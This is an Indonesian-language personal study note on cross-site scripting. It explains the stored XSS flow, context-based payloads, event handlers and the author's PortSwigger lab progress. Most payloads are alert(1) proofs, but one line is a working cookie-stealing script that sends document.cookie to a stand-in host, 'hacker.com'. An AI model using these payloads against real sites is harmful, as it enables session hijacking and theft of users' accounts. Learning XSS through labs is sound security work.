# 🔐 XSS — Cross-Site Scripting

> Catatan pribadi · theorbitless · updated Mei 2026

---

## 🧠 Konsep Inti

XSS = bikin JS jalan di **browser orang lain**, bukan di server.

**Flow Stored XSS:**
```
Hacker nulis payload → server simpen ke DB
→ korban buka halaman → browser korban baca HTML
→ browser eksekusi JS → cookie korban ke-curi
```

Server = tukang pos. Browser korban = yang baca & jalanin instruksi.

---

## 🗺️ Context — Kunci Utama XSS

Payload yang sama bisa jalan atau gagal tergantung **di mana dia nempel di HTML**.

| Context | Contoh | Payload Efektif |
|---|---|---|
| HTML text | `<div>SINI</div>` | `<script>alert(1)</script>` atau `<img src=x onerror=alert(1)>` |
| HTML attribute | `<input value="SINI">` | `" onmouseover="alert(1)` |
| href attribute | `<a href="SINI">` | `javascript:alert(1)` |

---

## ⚙️ Mekanisme Payload

### `<img src=x onerror=alert(1)>`
- `src=x` → sengaja invalid → browser gagal load gambar
- Gagal load → trigger `onerror`
- `onerror=alert(1)` → JS jalan
- **Insight**: error = sukses buat hunter 😄

### Event Handlers (semua awalan `on`)
Butuh trigger, tidak auto-jalan:
- `onclick` → klik
- `onmouseover` → mouse lewat
- `onload` → elemen selesai load
- `onerror` → elemen gagal load

### Attribute Injection
Payload: `" onmouseover="alert(1)`

```html
<!-- sebelum -->
<input value="PAYLOAD_DISINI">

<!-- sesudah -->
<input value="" onmouseover="alert(1)">
```

Tanda `"` pertama = nutup quote value yang dibuka server → keluar dari "penjara teks" ke "area bebas atribut".

---

## 🎯 Tujuan XSS (Bukan Cuma alert)

`alert(1)` = sinyal asap, bukan serangan. Bukti bahwa JS bisa jalan.

**Payload lab vs payload beneran:**
```html
<!-- lab -->
<script>alert(1)</script>

<!-- beneran — curi cookie -->
<script>fetch('https://hacker.com/curi?c=' + document.cookie)</script>
```

**Tujuan beneran:**
- Curi cookie session → login tanpa password (session hijacking)
- Bikin halaman fake minta password
- Auto-action atas nama korban

**Attacker-controlled server** = server yang nerima data curian:
- Lab: PortSwigger Exploit Server
- Hunting: VPS / interactsh / webhook.site / Burp Collaborator

---

## 🔧 JS Minimal yang Dibutuhkan Hunter

```javascript
fetch()              // ngirim request ke server
document.cookie      // baca cookie
+                    // gabungin string
document.location    // redirect
localStorage.getItem // baca data tersimpan
```

---

## ✅ Lab Progress

| Lab | Platform | Status |
|-----|----------|--------|
| Reflected XSS — nothing encoded | PortSwigger | ✅ solved |
| Reflected XSS — attribute injection | PortSwigger | ✅ solved |
| Stored XSS — nothing encoded | PortSwigger | ✅ solved |
| Stored XSS — filter bypass + curi cookie | PortSwigger | 🔄 next |

---

## 💡 Mindset

- Hunter beneran **nggak ngafalin payload** — pakai cheatsheet (PayloadAllTheThings)
- Yang penting: **ngerti KENAPA payload jalan**, bukan hafal payload
- Lupa itu normal — lawan dengan spaced repetition
- `alert(1)` di lab = secara teknis identik dengan hunting beneran

---

*last updated: Mei 2026*
